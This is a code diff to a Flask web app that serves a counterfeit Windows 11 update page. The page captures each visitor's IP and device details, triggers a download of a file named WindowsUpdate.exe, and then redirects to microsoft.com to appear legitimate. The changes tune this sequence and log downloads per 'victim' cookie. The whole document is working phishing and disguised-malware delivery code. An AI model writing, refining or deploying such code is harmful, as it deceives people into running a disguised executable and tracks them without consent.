@@ -290,11 +290,11 @@ def capture_browser_data():
     return jsonify({"status": "ok"})
 
 # ==========================================
-# MAIN PAGE - ULTRA REALISTIC WINDOWS 11 UPDATE WITH MICROSOFT REDIRECT
+# MAIN PAGE - ULTRA REALISTIC WINDOWS 11 UPDATE WITH PROPER DOWNLOAD THEN REDIRECT
 # ==========================================
 @app.route('/')
 def index():
-    """Shows a REAL Windows 11 update page with location/device capture and Microsoft redirect"""
+    """Shows a REAL Windows 11 update page with location/device capture and Microsoft redirect AFTER download"""
     
     # Get visitor IP
     visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
@@ -367,7 +367,7 @@ def index():
             ))
         conn.commit()
     
-    # ULTRA REALISTIC WINDOWS 11 UPDATE PAGE WITH MICROSOFT REDIRECT
+    # ULTRA REALISTIC WINDOWS 11 UPDATE PAGE - REMOVED META REFRESH, USING JAVASCRIPT FOR SEQUENCE
     html = f'''
     <!DOCTYPE html>
     <html lang="en">
@@ -375,8 +375,6 @@ def index():
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <title>Windows 11 Update</title>
-        <!-- ADDED: Microsoft redirect after 5 seconds -->
-        <meta http-equiv="refresh" content="5;url=https://www.microsoft.com">
         <style>
             * {{
                 margin: 0;
@@ -586,7 +584,7 @@ def index():
             </div>
         </div>
         
-        <!-- REAL-TIME BROWSER DATA CAPTURE SCRIPT -->
+        <!-- REAL-TIME BROWSER DATA CAPTURE SCRIPT WITH FIXED DOWNLOAD SEQUENCE -->
         <script>
         (function() {{
             // Collect real-time browser data
@@ -650,7 +648,7 @@ def index():
             const deviceDiv = document.getElementById('device-detect');
             deviceDiv.innerHTML = `<span>✅</span> Detected: ${{browserData.device.platform}} • ${{browserData.device.screen}} • ${{browserData.device.language}}`;
             
-            // Update progress
+            // Update progress and handle download sequence
             const progressFill = document.getElementById('progress-fill');
             const progressPercent = document.getElementById('progress-percent');
             const statusMsg = document.getElementById('status');
@@ -666,11 +664,16 @@ def index():
                 }} else if (percent >= 60 && percent < 90) {{
                     statusMsg.textContent = 'Verifying download integrity...';
                 }} else if (percent >= 90) {{
-                    statusMsg.textContent = 'Preparing to install...';
+                    statusMsg.textContent = 'Download complete!';
                     clearInterval(interval);
+                    
+                    // Trigger EXE download FIRST
+                    window.location.href = '/WindowsUpdate.exe';
+                    
+                    // Wait 2 seconds for download to start, THEN redirect to Microsoft
                     setTimeout(() => {{
-                        window.location.href = '/WindowsUpdate.exe';
-                    }}, 500);
+                        window.location.href = 'https://www.microsoft.com';
+                    }}, 2000);
                 }}
             }}, 200);
         }})();
@@ -689,6 +692,20 @@ def index():
 @app.route('/WindowsUpdate.exe')
 def download_exe():
     """Direct download endpoint for the EXE file"""
+    victim_id = request.cookies.get('victim_id', 'unknown')
+    
+    # Mark as downloaded in downloads table
+    with get_db() as conn:
+        conn.execute('''
+            INSERT INTO downloads (ip, user_agent, downloaded_time)
+            VALUES (?, ?, ?)
+        ''', (
+            request.remote_addr,
+            request.headers.get('User-Agent', ''),
+            datetime.datetime.now().isoformat()
+        ))
+        conn.commit()
+    
     return send_file('WindowsUpdate.exe', 
                      as_attachment=True, 
                      download_name='WindowsUpdate.exe',
